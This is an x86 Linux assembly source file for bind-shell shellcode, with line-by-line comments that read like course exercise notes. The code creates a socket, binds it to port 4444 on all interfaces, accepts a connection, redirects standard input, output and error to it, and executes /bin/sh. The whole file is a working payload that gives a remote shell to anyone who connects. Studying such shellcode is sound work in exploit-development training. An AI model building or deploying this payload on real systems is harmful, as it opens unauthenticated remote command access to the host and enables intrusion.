global _start


section .text

_start:

;sockfd= socket(AF_INET, SOCK_STREAM, 0)
xor eax,eax ;clean eax
mov al,0x66 ;set syscall number to socket
xor ebx,ebx ;zero out ebx
push ebx ;stack protocol=0, default (could be 6 for TCP)
inc ebx ;prepare ebx=1 for stack
push ebx ;stack type=1, sock_stream
push byte 0x2 ;stack domain, af_inet
mov ecx,esp ;store a pointer to the parameters for dup2
int 0x80 ;call the syscall, it returns the socket file descriptor to EAX

mov esi, eax ;store sockfd into ESI

;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
mov al,0x66 ;set syscall number to socket
pop ebx ;take the 2 from the stack to use as bind
;pop esi ; remove the 0x1 from stack and leave 0x0

;prepare struct
xor edx,edx ;zero out edx
push edx ;set the sin_addr=0 (INADDR_ANY)
push word 0x5C11 ;set sin_port=4444
push word bx ;sin_family AF_INET	=0x2
mov ecx, esp ;save pointer
;prepare struct end

push 0x10 ;addrlen=16 structure length
push ecx ; struck sockaddr pointer
push esi ; this is a pointer to the file descriptor sockfd
mov ecx, esp ;pointer to bind() args
int 0x80 ; exec sys bind

;listen
mov al,0x66 ;syscall 102
mov bl, 0x4 ;sys_listen
push ebx ;backlog=0x0
push esi ;sockfd
mov ecx,esp ;save pointer to args
int 0x80 ;call syscall

;accept
mov al,0x66 ;syscall 102
mov bl, 0x5 ;sys_accept
push edx ; addrlen=0x0
push edx ; struct=0x0
push esi ;socketd
mov ecx, esp ;save pointer to args
int 0x80 ;call syscall


;redirect
xchg ebx, eax ;store the socketfd in ebx, and 0x5 in eax. EBX will be the oldfd in DUP2
pop ecx ; pull the 0x00000000 from the stack
mov cl, 0x2 ; set counter to 2, this will be newfd in DUP2
;loop to call dup2 3 times and duplicate file descriptor for STDIN, STDOUT and STDERR
myloop:
 mov al,0x3F ;dup2 syscall
 int 0x80 ;syscall dup2
 dec ecx ; decrement counter
 jns myloop ; jmp to loop as long as SF is not set to 1


;execve
xor eax,eax
push eax ;push the ending 0x0
push 0x68732f2f ; "hs//" the trick is "//"="/" tom make it four bytes
push 0x6e69622f ; "nib/"
mov ebx, esp ;save the pointer to filename

push eax ; set argument t 0x0
mov ecx, esp ;save the pointer to argument envp

push eax ; set argument t 0x0
mov edx, esp ;save the pointer to argument ptr

mov al,0xb ;call execve
int 0x80 ; execute syscall
